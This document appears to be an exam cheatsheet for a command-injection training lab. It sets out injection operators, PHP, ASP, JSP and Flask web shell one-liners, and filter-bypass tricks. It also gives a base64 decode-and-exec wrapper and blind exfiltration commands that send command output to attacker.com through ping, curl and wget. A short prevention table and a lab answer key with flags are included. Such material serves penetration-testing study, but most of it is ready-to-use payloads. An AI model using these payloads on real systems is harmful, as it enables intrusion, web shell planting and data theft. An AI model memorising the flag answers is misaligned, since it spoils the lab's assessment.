# Command Injections — Exam Cheatsheet

---

## Detection

```bash
# Submit benign input first, then add each operator one at a time
?ip=127.0.0.1                        # baseline
?ip=127.0.0.1;whoami                 # ; test
?ip=127.0.0.1|whoami                 # | test  (only second output)
?ip=127.0.0.1&&whoami                # && test (both, if first succeeds)
?ip=127.0.0.1||whoami                # || test (only second, if first fails)
?ip=127.0.0.1%0awhoami               # newline
```
> Replace `ip` with the actual parameter name. Confirm injection by looking for `whoami` output (username like `www-data`) in the response. Use each operator separately — some may be blacklisted while others are not.

Output behavior cheatsheet:
| Operator | Char | URL-enc | Output |
|----------|------|---------|--------|
| Semicolon | `;` | `%3b` | Both |
| Newline | `\n` | `%0a` | Both |
| Pipe | `\|` | `%7c` | **Second only** |
| Background | `&` | `%26` | Both (second first) |
| AND | `&&` | `%26%26` | Both (if first OK) |
| OR | `\|\|` | `%7c%7c` | Second only (if first fails) |
| Subshell (backtick) | `` ` `` | `%60` | Inline |
| Subshell ($) | `$()` | `%24%28%29` | Inline |

---

## Web Shell One-Liners

```php
// PHP
<?php system($_REQUEST['cmd']); ?>
<?php passthru($_GET['c']); ?>          // alt if system blocked
<?php echo shell_exec($_GET['c']); ?>
<?php echo `{$_GET['c']}`; ?>           // backticks
```
> Four PHP web shell variants. Use `$_REQUEST` to accept both GET and POST. Switch to `passthru` or `shell_exec` if `system` is in `disable_functions`. The backtick variant is least commonly blocked.

```asp
<% eval request('cmd') %>
```
> Classic ASP web shell. Drop this in any writable `.asp` location. The `eval` function executes the value of the `cmd` parameter as VBScript.

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
> Java Server Pages (JSP) one-liner. Runs the command but does not return output by default — wrap in `ProcessBuilder` and read stdout if you need the result.

```python
__import__('os').system(request.args.get('cmd'))   # Flask
```
> Flask/Python shell that reads the `cmd` URL parameter and runs it as a system command. Drop into any `.py` file the Flask app will serve.

---

## Filter Bypass — By What's Blocked

### Operator blocked
| Blocked | Try |
|---------|-----|
| `;` | `%0a` (newline), `&&`, `\|`, `\|\|` |
| `&` and `\|` | `%0a`, `;` if not blocked |
| Everything common | `$()` subshell inline, `\`cmd\`` backticks |

### Space blocked
| Bypass | Payload |
|--------|---------|
| Tab | `%09` |
| `${IFS}` | `ls${IFS}-la` |
| Brace expansion | `{ls,-la}` |
| Input redirect | `cat</etc/passwd` |
| `$IFS$9` | `ls$IFS$9-la` |

### Slash `/` blocked
| Bypass | Payload |
|--------|---------|
| `${PATH:0:1}` | gives `/` |
| `${HOME:0:1}` | gives `/` |
| `${PWD:0:1}` | gives `/` |
| Char shift | `$(tr '!-}' '"-~'<<<.)` produces `/` |
| Hex printf | `$(printf '\57')` |

### Command word blocked
| Bypass | Payload for `whoami` |
|--------|----------------------|
| Quotes | `w'h'o'am'i` (single) or `w"h"o"am"i` (double) — even count, no mix |
| Backslash | `w\ho\am\i` |
| `$@` | `who$@ami` |
| `$1` | `who$1ami` (unset positional) |
| Variable concat | `a=who;b=ami;$a$b` |
| Case manip | `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` |
| Reverse | `$(rev<<<"imaohw")` |
| Wildcards | `/???/c?t` matches `/bin/cat` |
| Base64 exec | `bash<<<$(base64 -d<<<d2hvYW1p)` |

---

## The Universal Payload Template

When everything is blocked:
```
?input=127.0.0.1%0a<base64_decode_wrapper>
```

```bash
# 1. Build command, base64 it
echo -n 'cat /etc/passwd' | base64
# Y2F0IC9ldGMvcGFzc3dk

# 2. Construct decode-and-exec wrapper (no pipes, no spaces, no slashes)
bash<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dk)

# 3. Inject after newline operator
?ip=127.0.0.1%0abash<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dk)
```
> Encodes your command as base64 to avoid blocked characters, then uses `bash<<<` (here-string) and `${IFS}` to replace pipe and space. The whole thing injects after a URL-encoded newline `%0a` which acts as a command separator.

The `<<<` here-string replaces `|` pipe. `${IFS}` replaces space. `$()` subshell wraps the decode.

---

## Useful Env Var Tricks

```bash
${PATH:0:1}     # /
${HOME:0:1}     # /  (when HOME starts with /)
${PWD:0:1}      # /
${LS_COLORS:10:1}  # ; (offset varies by distro)
${IFS}          # space (default IFS)
${IFS%??}       # truncated IFS — sometimes useful
$0              # current shell name (e.g., "bash")
$@ $* $1 $9     # positional args — empty in interactive
$$              # current PID
$RANDOM         # random integer
```
> Use these when specific characters are blocked. `${PATH:0:1}` reliably produces `/` on any Linux system. `${IFS}` replaces space. `$0` gives the shell name. Combine them to build blocked characters from allowed ones.

---

## Character Shifting (universal char production)

```bash
# Get char N by feeding char N-1:
echo $(tr '!-}' '"-~'<<<[)        # [ → \
echo $(tr '!-}' '"-~'<<<.)        # . → /
echo $(tr '!-}' '"-~'<<<:)        # : → ;
```
> Shifts each character one position up in the ASCII table. Feed the character one below what you need. Use `man ascii` to find the right input character. Works when you need a character that is blocked but its predecessor is not.

ASCII reference: `man ascii` — find char N, use N-1 as input.

---

## Blind Injection (no output reflected)

Use out-of-band channels:

```bash
# DNS exfil (most reliable — UDP, often unfiltered)
ping -c 1 $(whoami).attacker.com
nslookup $(whoami).attacker.com

# HTTP exfil
curl http://attacker.com/$(id|base64)
wget http://attacker.com/?d=$(id|base64)

# Time-based
sleep 5                                  # if response delays 5s, injection worked
$(if [ $(whoami) = root ]; then sleep 5; fi)   # exfil bit by bit

# Write to file then read
whoami>/tmp/x; cat /tmp/x
```
> DNS ping exfil is the most reliable blind method — UDP DNS queries bypass most egress filters. HTTP exfil requires outbound HTTP. Time-based (`sleep`) confirms injection without any outbound access. File-write works when the output is readable via another request.

For DNS exfil with Burp Collaborator or interactsh:
```bash
ping -c 1 $(whoami).abc123.oast.fun
```
> Sends a DNS lookup with the command output embedded in the subdomain. Replace `abc123.oast.fun` with your Burp Collaborator or interactsh payload domain. The lookup appears in your collaborator log if injection succeeded.

---

## Automated Tools

```bash
# Linux — Bashfuscator
git clone https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

# Windows — Invoke-DOSfuscation
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
pwsh -c 'Import-Module ./Invoke-DOSfuscation.psd1; Invoke-DOSfuscation'
```
> Bashfuscator generates obfuscated bash commands to bypass WAFs and filters. `-s 1 -t 1` sets speed and time to minimum so the output is shorter. Invoke-DOSfuscation does the same for Windows CMD payloads.

---

## Prevention Reference

| Defense | Stops |
|---------|-------|
| **Argv array invocation** (`subprocess.run(["cmd", arg])`) | All command injection — the only true fix |
| Input validation (whitelist format via `filter_var`/regex) | Pre-injection filtering |
| Input sanitization (`preg_replace`) | Defense-in-depth |
| `escapeshellarg()` / `escapeshellcmd()` | Most injection (bypassable in edge cases) |
| `disable_functions` (PHP) | RCE even if injection succeeds |
| `open_basedir` | File system access |
| Run as low-privilege user (www-data) | Blast radius |
| ModSecurity / WAF | Common patterns |

---

## Lab Flag Reference

| Section | Technique | Flag / Answer |
|---------|-----------|---------------|
| 2 — Detection | HTML5 `pattern=` validation message | `Please match the requested format.` |
| 3 — Inject command | Find line of front-end validation | Line `17` |
| 4 — Other operators | Which shows only injected output? | `\|` (pipe) |
| 5 — Identify filters | Which of `\n`/`&`/`\|` not blacklisted? | `newline` |
| 6 — Space bypass | `ls -la` to find size of index.php | `1613` |
| 7 — Slash bypass | `ls /home` to find user | `1nj3c70r` |
| 8 — Cmd bypass | `cat /home/1nj3c70r/flag.txt` | `HTB{b451c_f1l73r5_w0n7_570p_m3}` |
| 9 — Obfuscation | base64 + bash<<<$() for piped command | `/usr/share/mysql/debian_create_root_user.sql` |
| 12 — Skills Assessment | TFM 2.4.6 move operation injection | `HTB{c0mm4nd3r_1nj3c70r}` |

---

## Decision Tree When Stuck

```
Detection — any character produces a different response?
  → start testing operators

Single operator works?
  → build command, test for cmd-name filter
  → bypass with quotes (c'a't), backslash (c\at), $@

Space blocked?
  → ${IFS} (universal), %09 (tab), {cmd,arg} (brace expansion)

Slash blocked?
  → ${PATH:0:1}, ${HOME:0:1}, character shifting

Command name blocked?
  → quote obfuscation, reverse with rev<<<, base64 decode

Output not visible?
  → blind: DNS exfil via ping/$(cmd).attacker.com
  → time-based: sleep with conditional

WAF blocking everything?
  → automated: Bashfuscator/DOSfuscation
  → combine: case + reverse + base64 + char shift
```
